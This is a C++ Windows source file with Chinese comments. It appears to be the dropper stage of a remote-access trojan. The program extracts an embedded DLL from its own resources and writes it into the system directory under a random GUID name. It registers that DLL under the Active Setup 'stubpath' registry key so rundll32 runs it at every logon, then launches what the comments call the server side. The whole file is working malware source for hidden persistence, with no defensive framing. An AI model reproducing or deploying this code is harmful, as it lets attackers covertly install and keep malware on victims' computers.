// ActiveX.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"
#include <objbase.h>
#include <stdio.h>



bool CreateMyFile(char* strFilePath,LPBYTE lpBuffer,DWORD dwSize)
{
	DWORD dwWritten;
	
	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}
                       //要释放的路径   资源ID            资源名
bool CreateEXE(char* strFilePath,int nResourceID,char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// 查找所需的资源
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "查找资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 获得资源尺寸
	dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "装载资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 为数据分配空间
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "分配内存失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 复制资源数据
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	
	
	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}
	
	GlobalFree((HGLOBAL)p);
	
	return true;
}

BOOL GetNUM(char *num)
{
	CoInitialize(NULL);
	char buf[64] = {0};
	GUID guid;
	if (S_OK == ::CoCreateGuid(&guid))
	{
		_snprintf(buf, sizeof(buf)
			, "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}"
			, guid.Data1
			, guid.Data2
			, guid.Data3
			, guid.Data4[0], guid.Data4[1]
			, guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5]
			, guid.Data4[6], guid.Data4[7]
			);
	}
	CoUninitialize();
	memcpy(num,buf,64);
	return TRUE;
}

void ActiveXSetup()
{
	HKEY hKey;
	char strFileName[MAX_PATH];           //dll文件名
	//char strFileName2[64];           //dll文件名
	char ActivexStr[1024];                //用于存储ActiveX的键字串
	char ActiveXPath[MAX_PATH];            //ActiveX路径
	char ActiveXKey[64];                   //ActiveX 的GUID字串
    char strCmdLine[MAX_PATH];              //存储启动的命令行参数


    ZeroMemory(strFileName,MAX_PATH);
	//ZeroMemory(strFileName2,MAX_PATH);
	ZeroMemory(ActiveXPath,MAX_PATH);
	ZeroMemory(ActivexStr,1024);
	ZeroMemory(ActiveXKey,MAX_PATH);
    ZeroMemory(strCmdLine,MAX_PATH);
     
	//得到Activex路径
	strcpy(ActiveXPath,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\");
	//得到Activex的GUID
	GetNUM(ActiveXKey);
	//构造dll完整文件名

	//strncpy(strFileName2,ActiveXKey+1,10);

    GetSystemDirectory(strFileName,MAX_PATH);
	strcat(strFileName,"\\");
	strcat(strFileName,ActiveXKey);
	strcat(strFileName,".dll");

	    //释放文件
  if(CreateEXE(strFileName,IDR_DLL,"DLL"))
  {
    //构造ActiveX的注册表键值
	sprintf(ActivexStr,"%s%s",ActiveXPath,ActiveXKey);
	//创建这个注册表
    int l_reg=	RegCreateKey(HKEY_LOCAL_MACHINE,ActivexStr,&hKey);  //ERROR_SUCCESS

	if(l_reg!=ERROR_SUCCESS)
	{
		//MessageBox(0,"写入注册表失败","",0);
		return;
	}

   //构造程序启动的命令行参数
	sprintf(strCmdLine,"%s %s,FirstRun","rundll32.exe",strFileName);
	//将参数写道注册表中
	RegSetValueEx(hKey,"stubpath",0,REG_EXPAND_SZ,(BYTE *)strCmdLine,lstrlen(strCmdLine));
	RegCloseKey(hKey);


	//启动服务端
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb=sizeof(STARTUPINFO);
	StartInfo.lpDesktop=NULL;
	StartInfo.lpReserved=NULL;
	StartInfo.lpTitle=NULL;
	StartInfo.dwFlags=STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2=0;
	StartInfo.lpReserved2=NULL;
	StartInfo.wShowWindow=SW_SHOWNORMAL;
	BOOL bReturn=CreateProcess(NULL,strCmdLine,NULL,NULL,FALSE,NULL,NULL,NULL,&StartInfo,&ProcessInformation);
  }   

  return ;
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

	ActiveXSetup();

	return 0;
}



